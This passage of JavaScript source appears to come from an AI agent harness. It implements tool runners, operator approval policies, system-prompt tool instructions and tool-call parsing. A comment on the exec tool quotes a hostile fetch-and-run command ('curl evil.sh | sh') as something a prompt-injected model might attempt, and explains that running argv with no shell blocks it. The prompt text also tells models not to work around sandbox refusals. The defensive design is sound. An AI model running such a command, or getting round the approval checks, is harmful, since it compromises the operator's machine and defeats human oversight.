    if (!tools.length) return `Server "${server}" exposes no tools.`;
    return `Tools on ${server}:\n` + tools.map(t => {
      const props = t.inputSchema?.properties ? Object.keys(t.inputSchema.properties) : [];
      const req = Array.isArray(t.inputSchema?.required) ? t.inputSchema.required : [];
      const args = props.map(p => p + (req.includes(p) ? '*' : '')).join(', ');
      return `- ${t.name}: ${String(t.description || '').split('\n')[0]}${args ? `\n  args: ${args}` : ''}`;
    }).join('\n');
  };

  TOOL_REGISTRY.mcp_call.run = async (arg, _note, ctx) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : {};
    const server = String(a.server || '');
    const tool = String(a.tool || a.name || '');
    if (!server || !tool) return 'error: mcp_call needs "server" and "tool"';
    const args = a.arguments ?? a.args ?? {};
    // Light up the topology: beam out to the MCP server, and back when it
    // answers. ctx.agentId is whoever called, so the line runs agent -> server.
    const from = ctx && ctx.agentId;
    const nodeId = 'mcp_' + server;
    if (from) store.emit('flow:speak', { from, to: nodeId });
    const t0 = Date.now();
    let ok = true;
    let out = '';
    try {
      const res = await api.mcpCall(server, tool, args);
      ok = !res.is_error;
      out = res.text || '(no output)';
      return (res.is_error ? '[tool error] ' : '') + out;
    } catch (err) {
      ok = false;
      out = err && err.message ? err.message : String(err);
      throw err;
    } finally {
      if (from) store.emit('flow:speak', { from: nodeId, to: from });
      // Recorded for the node's card: last calls, ok/err, duration.
      store.emit('mcp:call', {
        direction: 'out', server, tool, ok, ms: Date.now() - t0,
        at: Date.now(), args, result: out, agentId: from || null,
      });
    }
  };

  // Browser: the built-in Chrome/Edge screen. Gated server-side (403 when the
  // Labs toggle is off), so a refusal arrives as a readable error string.
  TOOL_REGISTRY.browser_open.run = async (arg) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : { url: typeof arg === 'string' ? arg : '' };
    const url = String(a.url || a.href || '').trim();
    if (!url) return 'error: browser_open needs a "url"';
    const st = await api.browserStatus();
    if (!st.enabled) return 'error: the browser is switched off (Config → Labs → Browser)';
    if (!st.available) return 'error: no Chrome or Edge is installed on this machine';
    if (!st.running) await api.browserLaunch(true);
    const info = await api.browserNavigate(url);
    return `Opened ${info.url || url}${info.title ? ` — ${info.title}` : ''}`;
  };

  TOOL_REGISTRY.browser_click.run = async (arg) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : (typeof arg === 'string' ? { selector: arg } : {});
    if (a.selector) {
      const expr = `(() => { const el = document.querySelector(${JSON.stringify(String(a.selector))}); `
        + `if (!el) return ''; el.scrollIntoView({block:'center'}); const r = el.getBoundingClientRect(); `
        + `return JSON.stringify({x:r.left+r.width/2, y:r.top+r.height/2}); })()`;
      const res = await api.browserEval(expr);
      if (!res || !res.result) return `error: no element matches ${a.selector}`;
      const c = JSON.parse(res.result);
      await api.browserClick(c.x, c.y);
      return `Clicked ${a.selector}`;
    }
    const x = Number(a.x), y = Number(a.y);
    if (!Number.isFinite(x) || !Number.isFinite(y)) return 'error: browser_click needs a "selector", or numeric "x" and "y"';
    await api.browserClick(x, y);
    return `Clicked (${x}, ${y})`;
  };

  TOOL_REGISTRY.browser_type.run = async (arg) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : { text: String(arg ?? '') };
    const text = String(a.text ?? a.value ?? '');
    if (!text) return 'error: browser_type needs "text"';
    if (a.selector) {
      await api.browserEval(`(() => { const el = document.querySelector(${JSON.stringify(String(a.selector))}); if (el) el.focus(); return !!el; })()`);
    }
    await api.browserType(text);
    if (a.enter) await api.browserKey('Enter');
    return `Typed ${text.length} character(s)${a.enter ? ' and pressed Enter' : ''}`;
  };

  TOOL_REGISTRY.browser_read.run = async () => {
    const res = await api.browserRead();
    const t = String((res && res.text) || '').trim();
    return t ? t.slice(0, 8000) : '(the page has no visible text)';
  };

  TOOL_REGISTRY.browser_wait.run = async (arg) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : { ms: arg };
    const ms = Math.max(0, Math.min(30000, parseInt(a.ms, 10) || 1000));
    await new Promise((r) => setTimeout(r, ms));
    return `Waited ${ms}ms`;
  };

  TOOL_REGISTRY.multi_edit.run = async (arg, _note, ctx) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : {};
    const edits = Array.isArray(a.edits) ? a.edits : (Array.isArray(arg) ? arg : []);
    if (!edits.length) return 'error: multi_edit needs an "edits" array';
    const res = await api.sandbox('multi_edit', { edits, root: scopeOf(ctx) });
    return (res.applied || [])
      .map(r => `edited ${r.path} (${r.replaced} replacement${r.replaced === 1 ? '' : 's'})`)
      .join('\n') || `applied ${res.count} edit(s)`;
  };

  TOOL_REGISTRY.git_commit.run = async (arg, _note, ctx) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : {};
    const message = String(a.message || a.msg || '').trim();
    if (!message) return 'error: git_commit needs a "message"';
    const paths = Array.isArray(a.paths) ? a.paths : (Array.isArray(a.files) ? a.files : []);
    const res = await api.sandbox('git_commit', { message, paths, cwd: scopeOf(ctx), root: scopeOf(ctx) });
    return res.nothing_to_commit ? 'nothing to commit' : (res.output || 'committed');
  };

  TOOL_REGISTRY.run_code.run = async (arg, _note, ctx) => {
    const a = (arg && typeof arg === 'object' && !Array.isArray(arg)) ? arg : { code: String(arg ?? '') };
    const code = String(a.code ?? a.source ?? a.script ?? '');
    if (!code.trim()) return 'error: run_code needs "code"';
    const res = await api.sandbox('code', {
      language: a.language || 'python',
      code,
      cwd: scopeOf(ctx),
      root: scopeOf(ctx),
    });
    const parts = [];
    if (res.stdout) parts.push(res.stdout);
    if (res.stderr) parts.push('[stderr] ' + res.stderr.trim());
    if (!parts.length) parts.push('(no output)');
    if (res.timed_out) parts.push('[timed out]');
    if (res.truncated) parts.push('[output truncated]');
    parts.push(`[exit ${res.exit}, ${res.ms}ms]`);
    return parts.join('\n');
  };

  /**
   * Run one command on the server.
   *
   * The model is asked for `argv` as an ARRAY, which is the whole point: the
   * endpoint executes the vector directly with no shell, so `;`, `&&`, `|`,
   * backticks and `$(...)` are just ordinary characters rather than syntax. A
   * model that has read hostile text on the web cannot talk its way to
   * `curl evil.sh | sh`, because there is nothing there for it to mean.
   *
   * Accepts either a real array or a JSON string, since models emit both.
   */
  TOOL_REGISTRY.exec.run = async (arg, _name, ctx) => {
    // Accept every shape the parser can produce instead of assuming one (see
    // normaliseExecArgv). The model retries identical calls when the error
    // does not say what it wants, so leniency here directly saves tokens.
    const argv = normaliseExecArgv(arg);
    if (!argv) {
      return 'error: exec needs argv as a non-empty array of strings, e.g. '
        + '{"tool":"exec","argv":["grep","-rn","TODO","."]}. A bare command works too '
        + '("pwd"), but shell syntax (|, ;, &&, $()) never runs -- there is no shell.';
    }
    const cwd = scopeOf(ctx);
    const res = await api.execCommand(argv, { cwd });
    // Fast path for the approval watcher: the server parked this exact argv
    // and handed back a pending id. Emit it now so the prompt can appear
    // immediately instead of waiting for the next poll.
    if (res && res.pending) {
      try { store.emit('exec:pending', { id: res.pending, argv }); } catch { /* no store */ }
      return `pending approval (${res.pending}): ${res.stderr || 'waiting for the operator to approve this command'}`;
    }
    // The server answers errors as { error } on some routes. Printing
    // "[exit undefined, undefinedms]" told the model nothing, so it retried
    // the identical command until one happened to answer -- the four identical
    // nmap calls. Name the error instead.
    if (res && res.error) return `error: ${res.error}`;
    if (!res || typeof res !== 'object') {
      return `error: exec returned no result${res === undefined ? '' : ` (${JSON.stringify(res)})`}`;
    }
    const parts = [];
    if (res.stdout) parts.push(res.stdout.trimEnd());
    if (res.stderr) parts.push('[stderr] ' + res.stderr.trim());
    if (!parts.length) parts.push('(no output)');
    if (res.truncated) parts.push('[output truncated]');
    if (res.exit === undefined || res.ms === undefined) {
      parts.push(`[incomplete result: ${JSON.stringify(res).slice(0, 300)}]`);
    } else {
      parts.push(`[exit ${res.exit}, ${res.ms}ms]`);
    }
    return parts.join('\n');
  };
}

function readNotes() {
  try {
    const raw = localStorage.getItem(NOTES_KEY);
    const parsed = raw ? JSON.parse(raw) : [];
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function writeNotes(notes) {
  try { localStorage.setItem(NOTES_KEY, JSON.stringify(notes.slice(-20))); } catch { /* ignore */ }
}

/** The system-prompt block that teaches a model the tool protocol. */
export function toolInstructions(enabledTools, sandboxRoot, protocol = 'json') {
  const names = enabledTools.filter(t => TOOL_REGISTRY[t]);
  if (!names.length) return '';
  const mode = ['json', 'anthropic', 'native', 'native-api', 'plain'].includes(protocol) ? protocol : 'json';

  const jsonExample = t => {
    const def = TOOL_REGISTRY[t];
    if (t === 'write_file') {
      return '{"tool":"write_file","arg":{"path":"src/new.js","content":"...","mode":"write"}}';
    }
    if (t === 'ask_agent' || t === 'tell_agent') {
      const key = t === 'ask_agent' ? 'question' : 'message';
      return `{"tool":"${t}","arg":{"name":"<agent>","${key}":"..."}}`;
    }
    if (t === 'declare_goal_complete') {
      return '{"tool":"declare_goal_complete","arg":{"summary":"what you finished"}}';
    }
    // exec's value is an array, not a string, so the generic "arg" example
    // ("<argv>") actively misled models into sending a bare string.
    if (t === 'exec') {
      return '{"tool":"exec","arg":{"argv":["grep","-rn","TODO","src"]}}';
    }
    if (t === 'str_replace_editor') {
      return '{"tool":"str_replace_editor","arg":{"command":"str_replace","path":"src/app.js","old_str":"...","new_str":"..."}}';
    }
    if (t === 'edit_file') {
      return '{"tool":"edit_file","arg":{"path":"src/app.js","old_string":"...","new_string":"..."}}';
    }
    if (t === 'apply_patch') {
      return '{"tool":"apply_patch","arg":{"patch":"*** Begin Patch\\n*** Update File: src/app.js\\n@@\\n context line\\n-removed line\\n+added line\\n*** End Patch"}}';
    }
    if (t === 'git') {
      return '{"tool":"git","arg":{"args":["diff","HEAD~1"]}}';
    }
    if (t === 'http_request') {
      return '{"tool":"http_request","arg":{"method":"POST","url":"https://api.example.com/v1/x","headers":{"Content-Type":"application/json"},"body":"{}"}}';
    }
    if (t === 'todo_write') {
      return '{"tool":"todo_write","arg":{"todos":[{"content":"...","status":"in_progress"}]}}';
    }
    if (t === 'mcp_call') {
      return '{"tool":"mcp_call","arg":{"server":"files","tool":"read_file","arguments":{"path":"/tmp/x"}}}';
    }
    if (t === 'mcp_list') {
      return '{"tool":"mcp_list","arg":{}}';
    }
    if (t === 'browser_open') {
      return '{"tool":"browser_open","arg":{"url":"https://example.com"}}';
    }
    if (t === 'browser_click') {
      return '{"tool":"browser_click","arg":{"selector":"#submit"}}';
    }
    if (t === 'browser_type') {
      return '{"tool":"browser_type","arg":{"selector":"#email","text":"me@example.com","enter":true}}';
    }
    if (t === 'browser_read') {
      return '{"tool":"browser_read","arg":{}}';
    }
    if (t === 'browser_wait') {
      return '{"tool":"browser_wait","arg":{"ms":1500}}';
    }
    if (t === 'multi_edit') {
      return '{"tool":"multi_edit","arg":{"edits":[{"path":"src/app.js","old_string":"...","new_string":"..."}]}}';
    }
    if (t === 'git_commit') {
      return '{"tool":"git_commit","arg":{"message":"...","paths":["src/app.js"]}}';
    }
    if (t === 'run_code') {
      return '{"tool":"run_code","arg":{"language":"python","code":"print(1+1)"}}';
    }
    return def.arg ? `{"tool":"${t}","arg":"<${def.arg}>"}` : `{"tool":"${t}"}`;
  };

  const anthropicExample = t => {
    const def = TOOL_REGISTRY[t];
    const params = [];
    if (t === 'write_file') {
      params.push('<parameter name="path">src/new.js</parameter>');
      params.push('<parameter name="content">...</parameter>');
      params.push('<parameter name="mode">write</parameter>');
    } else if (t === 'ask_agent' || t === 'tell_agent') {
      const key = t === 'ask_agent' ? 'question' : 'message';
      params.push('<parameter name="name">agent-name</parameter>');
      params.push(`<parameter name="${key}">...</parameter>`);
    } else if (t === 'declare_goal_complete') {
      params.push('<parameter name="summary">what you finished</parameter>');
    } else if (t === 'exec') {
      params.push('<parameter name="argv">["grep","-rn","TODO","src"]</parameter>');
    } else if (t === 'str_replace_editor') {
      params.push('<parameter name="command">str_replace</parameter>');
      params.push('<parameter name="path">src/app.js</parameter>');
      params.push('<parameter name="old_str">...</parameter>');
      params.push('<parameter name="new_str">...</parameter>');
    } else if (t === 'edit_file') {
      params.push('<parameter name="path">src/app.js</parameter>');
      params.push('<parameter name="old_string">...</parameter>');
      params.push('<parameter name="new_string">...</parameter>');
    } else if (t === 'apply_patch') {
      params.push('<parameter name="patch">*** Begin Patch\n*** Update File: src/app.js\n@@\n context\n-old\n+new\n*** End Patch</parameter>');
    } else if (t === 'git') {
      params.push('<parameter name="args">["diff","HEAD~1"]</parameter>');
    } else if (t === 'http_request') {
      params.push('<parameter name="method">POST</parameter>');
      params.push('<parameter name="url">https://api.example.com/v1/x</parameter>');
      params.push('<parameter name="headers">{"Content-Type":"application/json"}</parameter>');
      params.push('<parameter name="body">{}</parameter>');
    } else if (t === 'todo_write') {
      params.push('<parameter name="todos">[{"content":"...","status":"in_progress"}]</parameter>');
    } else if (t === 'mcp_call') {
      params.push('<parameter name="server">files</parameter>');
      params.push('<parameter name="tool">read_file</parameter>');
      params.push('<parameter name="arguments">{"path":"/tmp/x"}</parameter>');
    } else if (t === 'mcp_list') {
      params.push('<parameter name="server">files</parameter>');
    } else if (t === 'browser_open') {
      params.push('<parameter name="url">https://example.com</parameter>');
    } else if (t === 'browser_click') {
      params.push('<parameter name="selector">#submit</parameter>');
    } else if (t === 'browser_type') {
      params.push('<parameter name="selector">#email</parameter>');
      params.push('<parameter name="text">me@example.com</parameter>');
      params.push('<parameter name="enter">true</parameter>');
    } else if (t === 'browser_read') {
      // no parameters
    } else if (t === 'browser_wait') {
      params.push('<parameter name="ms">1500</parameter>');
    } else if (t === 'multi_edit') {
      params.push('<parameter name="edits">[{"path":"src/app.js","old_string":"...","new_string":"..."}]</parameter>');
    } else if (t === 'git_commit') {
      params.push('<parameter name="message">...</parameter>');
      params.push('<parameter name="paths">["src/app.js"]</parameter>');
    } else if (t === 'run_code') {
      params.push('<parameter name="language">python</parameter>');
      params.push('<parameter name="code">print(1+1)</parameter>');
    } else if (def.arg) {
      params.push(`<parameter name="${def.arg}">...</parameter>`);
    }
    return `<function_calls><invoke name="${t}">${params.join('')}</invoke></function_calls>`;
  };

  const nativeExample = t => `<|tool_call|>${jsonExample(t)}<|/tool_call|>`;

  const examples = mode === 'anthropic'
    ? names.map(anthropicExample).join('\n')
    : mode === 'native'
      ? names.map(nativeExample).join('\n')
      : names.map(jsonExample).join('  ');

  const customHelp = names
    .filter(t => TOOL_REGISTRY[t]?.custom)
    .map(t => {
      const def = TOOL_REGISTRY[t];
      const arg = def.arg ? ` (arg: ${def.arg})` : '';
      const extra = def.instructions ? `\n  ${def.instructions}` : '';
      return `- ${t}${arg}: ${def.describe}${extra}`;
    })
    .join('\n');

  const notes = [];
  if (names.includes('exec')) {
    notes.push(
      'exec takes argv as an ARRAY of strings, one entry per argument. '
      + 'Each flag is its own array entry, so ["grep","-rn","x","."] is four entries, never one string.'
    );
    notes.push(
      'There is NO shell. The pipes, redirects and chaining you would type in a terminal '
      + '(| ; && > >> $( ) backticks) are NOT special here and will be passed through as literal '
      + 'text. Use one command per call and read its output before deciding the next.'
    );
    notes.push(
      'Anything the sandbox refuses comes back as an error string telling you why. Read it and '
      + 'adjust �?" do not retry the identical call, and do not try to work around a refusal with '
      + 'a different tool. A command may also wait for the operator to approve it.'
    );
    const win = typeof navigator !== 'undefined'
      && /Windows/i.test(String(navigator.userAgent || ''));
    if (win) {
      notes.push(
        'This sandbox is on Windows. echo, pwd, type, where, dir, mkdir and sleep are handled '
        + 'internally; ls, cat, head, tail, wc, grep, sed and awk work when Git for Windows is '
        + 'installed. Use real .exe programs (ipconfig, findstr, tasklist) and pass the exact '
        + 'argv, never PowerShell/cmd syntax. npm.cmd and other .cmd/.bat shims are not run.'
      );
    }
  }
  if (names.some(t => String(t).startsWith('browser_'))) {
    notes.push(
      'You CAN automate a browser. The built-in browser (browser_open / browser_click / browser_type / '
      + 'browser_read / browser_wait) drives a REAL Chrome/Edge window the operator can watch — you do NOT '
      + 'need Playwright, Selenium, Puppeteer or a browser extension, and you should never tell the user you '
      + 'lack browser access. Workflow: browser_open a URL, browser_read to see the page, browser_click / '
      + 'browser_type to act (target fields with a CSS selector), then browser_read again to check the result.'
    );
  }
  if (names.includes('web_search') || names.includes('fetch_url')) {
    notes.push(
      'To use a web result, fetch_url it — search gives you titles and URLs, not page text.'
    );
  }
  if (names.includes('read_file')) {
    notes.push(
      'read_file accepts "path" or "path 20-80" to read a line range of a large file.'
    );
  }
  if (names.includes('grep_code')) {
    notes.push('grep_code takes a regular expression, e.g. /function\\s+\\w+\\s*\\(/');
  }
  if (names.includes('write_file')) {
    notes.push(
      'write_file takes a JSON object with "path" and "content"; add "mode":"append" to append. '
      + 'Read the file first so you edit rather than overwrite blindly.'
    );
  }
  if (names.includes('str_replace_editor') || names.includes('edit_file')) {
    notes.push(
      'Prefer a targeted edit over rewriting a file: str_replace_editor with command "str_replace" '
      + '(old_str/new_str) or edit_file (old_string/new_string). Read the file first and copy the '
      + 'old text EXACTLY, indentation included. The edit is refused when the old text is missing or '
      + 'matches more than once — add surrounding lines to make it unique, or pass "replace_all": true.'
    );
  }
  if (names.includes('apply_patch')) {
    notes.push(
      'apply_patch takes a V4A patch: "*** Begin Patch" ... "*** End Patch", containing "*** Add File:", '
      + '"*** Update File:" (optionally with "*** Move to:"), and "*** Delete File:". In an update, prefix '
      + 'unchanged context lines with a space, removals with "-", additions with "+". Read the file first; '
      + 'a hunk whose context does not match exactly once is refused.'
    );
  }
  if (names.includes('git')) {
    notes.push(
      'git takes args as an ARRAY of strings, e.g. ["status"]. Read-only subcommands '
      + '(status, diff, log, show, blame) run at once; add/commit/checkout and other writes ask the '
      + 'operator first. Start with ["status"], and never commit or push unless the user asked.'
    );
  }
  if (names.includes('http_request')) {
    notes.push(
      'http_request is for API work — set method, headers and body. Use fetch_url to simply read a page.'
    );
  }
  if (names.includes('todo_write')) {
    notes.push(
      'todo_write keeps a plan for a multi-step job. Send the WHOLE list each time and keep exactly '
      + 'one item in_progress; mark items completed as you finish them.'
    );
  }
  if (names.includes('think')) {
    notes.push(
      'think is a private scratchpad — it is echoed back to you and never shown to the user. Use it to '
      + 'reason about the next step before a risky or irreversible action.'
    );
  }
  if (names.includes('mcp_call')) {
    notes.push(
      'mcp_call runs a tool on a connected MCP server; pass the server, the tool name and its '
      + 'arguments object. Call mcp_list first to see the servers and their tool names; pass only '
      + 'the arguments the tool names.'
    );
  }
  if (names.includes('multi_edit')) {
    notes.push(
      'multi_edit applies several search/replace edits in one call and is ALL-OR-NOTHING: if any edit does '
      + 'not match exactly once, nothing is written. Same exact-match rule as edit_file, but across files.'
    );
  }
  if (names.includes('git_commit')) {
    notes.push(
      'git_commit stages the paths you give (or everything when you give none) and commits with "message". '
      + 'Only commit when the user asked; run git status and git diff first so you know what will go in.'
    );
  }
  if (names.includes('run_code')) {
    notes.push(
      'run_code runs a snippet and returns stdout/stderr. Each call is a fresh process, so variables do NOT '
      + 'survive between calls — but files you write in the working directory do. Default language is python.'
    );
  }
  if (names.includes('ask_agent')) {
    notes.push(
      'ask_agent runs the other agent for real and hands you their reply, so use it '
      + 'when you genuinely need their answer before you can finish. It costs a real '
      + 'model call. list_agents first if you are unsure who to ask, and refer to '
      + 'agents by their exact name.'
    );
  }
  if (names.includes('tell_agent') || names.includes('read_mailbox')) {
    notes.push(
      'tell_agent delivers an instruction without waiting for a reply; they pick it up '
      + 'with read_mailbox.'
    );
  }
  // Tell the model where it stands. Without this, agents guess at paths and
  // burn a step on a rejected one.
  if (sandboxRoot && names.some(t => SANDBOX_TOOLS.includes(t) && t !== 'web_search' && t !== 'fetch_url')) {
    notes.push(
      `You are working in "${sandboxRoot}". Relative paths in the file tools are resolved `
      + 'inside it, and nothing outside it can be reached. Call list_dir with no path '
      + 'to see the directory you are rooted at.'
    );
  }

  // Native API tools are supplied as schemas by the caller, so the model must
  // not be taught a competing JSON/XML syntax. The notes above still matter
  // (argv arrays, exact edits, the sandbox root).
  if (mode === 'native-api') {
    return (
      '\n\nTOOL USE\n'
      + 'Tools are provided directly by the API. Call them through the native tool interface; '
      + 'do not print JSON, XML, <|tool_call|> tags, or a "tool" object in your reply.\n'
      + 'You may call several independent tools in one turn. Read each result before deciding '
      + 'what to do next, and do not call a tool that is not in the provided list.\n'
      + 'When no tool is needed, answer the user in plain prose.\n'
      + (notes.length ? '\n' + notes.join('\n') : '')
    );
  }

  const rules = {
    json: 'exactly ONE tool request, as a single JSON object and nothing else.\n'
      + 'For (b) output only the JSON: no explanation, no markdown fence, no status\n'
      + 'line, no "I am calling...", no "awaiting results".',
    plain: 'exactly ONE tool request, as a single JSON object and nothing else.\n'
      + 'Output the raw JSON only. No prose, no markdown fence, no wrapper tags.',
    anthropic: 'exactly ONE Claude-style XML tool call and nothing else:\n'
      + '<function_calls><invoke name="TOOL"><parameter name="KEY">VALUE</parameter></invoke></function_calls>\n'
      + 'No prose around it, no markdown fence.',
    native: 'exactly ONE native tool call and nothing else:\n'
      + '<|tool_call|>{"tool":"TOOL","arg":...}<|/tool_call|>\n'
      + 'No prose around it, no markdown fence.',
  }[mode];

  const exampleTurn = mode === 'anthropic'
    ? '<function_calls>\n<invoke name="list_agents"></invoke>\n</function_calls>'
    : mode === 'native'
      ? '<|tool_call|>{"tool":"list_agents"}<|/tool_call|>'
      : '{"tool":"list_agents"}';

  return (
    '\n\nTOOL USE\n'
    + 'You may use the tools listed below. Your ENTIRE reply must be EITHER\n'
    + '  (a) normal prose answering the user, OR\n'
    + '  (b) ' + rules + '\n\n'
    +     'A tool request wrapped in prose is ignored and treated as the final answer.\n'
    + 'A tool call is the ONE exception to any instruction to keep replies short, to reply\n'
    + 'with only text, or to limit the number of words. When you want to act, the tool call\n'
    + 'IS your reply — never announce that you will use a tool, emit the call itself.\n\n'
    + 'Available tools:\n'
    + examples
    + (customHelp ? '\n\nCustom tools:\n' + customHelp : '')
    + '\n\n'
    + 'Example turn 1 (you want a tool):\n  ' + exampleTurn.replace(/\n/g, '\n  ') + '\n'
    + 'Example turn 2 (the harness replies TOOL_RESULT: ...):\n'
    + '  Now you write the answer in plain prose. No more tool calls.\n\n'
    + 'Never invent a tool that is not listed. If none fits, just answer normally. '
    + 'You get ' + MAX_TOOL_STEPS + ' tool calls per turn, so spend them carefully.'
    + (notes.length ? '\n' + notes.join('\n') : '')
  );
}
/**
 * Confirmation prompt for tools that change something.
 *
 * Auto-approve (Config tab -> Auto Approve) skips the prompt. It defaults to
 * OFF: turning it on means any agent can overwrite files without a human in
 * the loop, so it is a switch you choose rather than one you inherit.
 */
/**
 * exec argv arrives in several shapes (bare array, {argv:[...]},
 * {"cmd":"[...]"}, a JSON string, or a bare command string). Normalise to an
 * argv array, or null when nothing usable is there. A bare string becomes a
 * single element -- still no shell involved, so it cannot smuggle syntax, and
 * it stops the model retry-looping a call that was one pair of brackets away
 * from correct (e.g. {"argv":"pwd"}).
 */
function normaliseExecArgv(arg) {
  let argv = arg;
  if (argv && typeof argv === 'object' && !Array.isArray(argv)) {
    if (Array.isArray(argv.argv)) {
      argv = argv.argv;
    } else {
      const keys = Object.keys(argv);
      if (keys.length === 1 && typeof argv[keys[0]] === 'string') {
        // A bare command string ({"argv":"pwd"}) becomes a single element:
        // still no shell involved, so it cannot smuggle syntax.
        const s = argv[keys[0]].trim();
        try { argv = JSON.parse(s); } catch { argv = s ? [s] : null; }
      } else {
        argv = null;
      }
    }
  }
  if (typeof argv === 'string') {
    const trimmed = argv.trim();
    if (!trimmed) return null;
    try {
      argv = JSON.parse(trimmed);
    } catch {
      argv = [trimmed];
    }
  }
  if (!Array.isArray(argv) || !argv.length) return null;
  if (argv.some(a => typeof a !== 'string')) return null;
  return argv;
}

/**
 * Effective approval mode for one tool: 'allow', 'ask' or 'deny'.
 *
 * Precedence: Auto Deny wins over everything (the panic button: anything
 * that would ask is refused instead). Otherwise the per-tool setting, default
 * 'ask'. Tools without needsApproval always run, exactly as before.
 */
export function policyFor(name, ctx) {
  const def = TOOL_REGISTRY[name];
  if (!def || !def.needsApproval) return 'allow';
  const agent = agentFromCtx(ctx);
  const autoDeny = agent
    ? settingFor(agent, 'autoDeny') === true
    : store.get('settings.autoDeny') === true;
  if (autoDeny) return 'deny';
  const p = (agent ? settingFor(agent, 'toolPolicy') : store.get('settings.toolPolicy')) || {};
  const mode = p[name];
  return mode === 'allow' || mode === 'deny' ? mode : 'ask';
}

function agentFromCtx(ctx) {
  const id = ctx?.agentId;
  if (!id) return null;
  return (store.get('agents') || []).find(a => a.id === id) || null;
}

async function approve(tool, arg, ctx) {
  const def = TOOL_REGISTRY[tool];
  const agent = agentFromCtx(ctx);
  // A tool can opt out of auto-approval entirely. Anything destructive should
  // set alwaysApprove so that turning the setting on cannot wave it through.
  const auto = agent
    ? settingFor(agent, 'autoApprove') === true
    : store.get('settings.autoApprove') === true;
  if (!def.alwaysApprove && auto) return true;
  // Session scope: approved once this page-load, not asked again. Reload
  // resets, so approval can never quietly become permanent.
  if (sessionApproved(tool, arg)) return true;
  const ok = await askApproval(tool, arg);
  if (ok) rememberApproval(tool, arg);
  return ok;
}

/**
 * Run one requested tool.
 * @returns {string} the result text fed back to the model
 */
export async function runTool(name, arg, noteName, ctx) {
  const def = TOOL_REGISTRY[name];
  if (!def) return `denied: unknown tool ${name}`;
  if (def.custom) {
    const agent = agentFromCtx(ctx);
    const enabled = agent
      ? (Array.isArray(agent.tools) ? agent.tools : defaultTools())
      : [];
    if (!agent || !enabled.includes(name)) {
      return `denied: ${name} is not enabled for this agent`;
    }
  }
  // Per-tool policy first: deny refuses outright (auto-deny says why),
  // allow skips the prompt, ask falls through to the Auto Approve check
  // and the confirmation dialog below.
  const mode = policyFor(name, ctx);
  if (mode === 'deny') {
    const agent = agentFromCtx(ctx);
    const autoDeny = agent
      ? settingFor(agent, 'autoDeny') === true
      : store.get('settings.autoDeny') === true;
    const why = autoDeny ? 'auto-deny is on' : `${name} is set to deny`;
    return `denied: ${why}`;
  }
  if (mode === 'ask' && !(typeof def.safeWhen === 'function' && def.safeWhen(arg))
      && !(await approve(name, arg, ctx))) return 'denied by user';
  const t0 = Date.now();
  const who = () => {
    const a = agentFromCtx(ctx);
    return { agentId: ctx?.agentId, agentName: a?.name };
  };
  try {
    // asText, not String: a tool returning a structured value must arrive as
    // JSON, never "[object Object]".
    const out = asText(await def.run(arg, noteName, ctx));
    try { trace('tool', { ...who(), tool: name, ms: Date.now() - t0, ok: true }); } catch { /* best-effort */ }
    return compactText(out, MAX_TOOL_OUTPUT_CHARS);
  } catch (err) {
    try {
      trace('tool', { ...who(), tool: name, ms: Date.now() - t0, ok: false,
        error: err && err.message ? String(err.message).slice(0, 200) : 'error' });
    } catch { /* best-effort */ }
    return `error: ${err && err.message ? err.message : asText(err)}`;
  }
}

/**
 * Decide whether a model reply is a tool request.
 * Tolerates fenced JSON and stray prose around it.
 *
 * `fallback` is consulted when the visible content holds no tool call.
 * Reasoning models (Nemotron, DeepSeek-style) tend to put the JSON they mean
 * to send in their reasoning channel and then narrate the action in the
 * visible answer -- "Called list_agents three times; awaiting tool results".
 * Without this the harness reads that prose as the final reply, so the agent
 * looks like it is endlessly calling tools that never run.
 *
 * @returns {object|null} {tool, arg, note}
 */
export function parseToolCall(text, fallback) {
  const direct = _parseToolCall(text);
  if (direct) return direct;
  if (fallback && fallback !== text) return _parseToolCall(fallback);
  return null;
}

function _parseToolCall(text) {
  const raw = String(text || '').trim();
  // 2000 chars was fine when every tool took a short argument, but a file
  // write carries its whole content inline and overflows that instantly.
  if (!raw || raw.length > MAX_TOOL_CALL_CHARS) return null;

  // JSON form first -- our own protocol.
  const block = extractJsonObject(raw);
  if (block) {
    const hit = fromToolObject(block);
    if (hit) return hit;
  }

  // Then the native form. Qwen/GLM-style models were trained to emit
  //   <|tool_call|>read_file{"path":"test.txt"}<|tool_call|>
  // and were never taught the JSON protocol above, so they ignore it
  // completely and the markup used to reach the transcript verbatim.
  const invoke = parseInvokeToolCall(raw);
  if (invoke) return invoke;
  const fnTag = parseFunctionTagToolCall(raw);
  if (fnTag) return fnTag;
  return parseNativeToolCall(raw);
}

/**
 * Map a decoded object to a tool call, tolerating the field names the
 * different dialects use (tool/name/function, arg/args/arguments).
 */
function fromToolObject(source) {
  let obj = source;
  if (typeof source === 'string') {
    try { obj = JSON.parse(source); } catch { return null; }
  }
  if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return null;

  // {"function":"read_file","arguments":{...}} -- OpenAI function-call shape.
  const fn = obj.function;
  const name = String(obj.tool || obj.name || (fn && (fn.name || fn.tool)) || '').trim();
  if (!name || !Object.prototype.hasOwnProperty.call(TOOL_REGISTRY, name)) return null;

  let arg = obj.arg;
  if (arg === undefined && fn) arg = fn.arguments;
  if (arg === undefined) arg = obj.args;
  if (arg === undefined) arg = obj.arguments;
  if (arg === undefined) arg = obj.text;
  // Several dialects send arguments as a JSON *string*.
  if (typeof arg === 'string' && /^\s*\{/.test(arg)) {
    try { arg = JSON.parse(arg); } catch { /* keep the raw string */ }
  }
  return { tool: name, arg };
}

/** Zero-width, bidi and fullwidth characters models sprinkle into markup. */
const INVISIBLE = /[\u200B-\u200F\u2028\u2029\u2060\uFEFF]/g;

/**
 * Normalise the many spellings of the native wrapper.
 *
 * Observed in the wild: <|tool_call|>, <tool_call>, and the fullwidth-pipe and
 * underscore-padded forms Qwen emits (<｜tool▁calls▁begin｜>). Normalising to
 * plain ASCII up front means one matcher covers all of them.
 */
function normaliseNative(text) {
  return String(text)
    .replace(INVISIBLE, '')
    .replace(/antml:/gi, '')
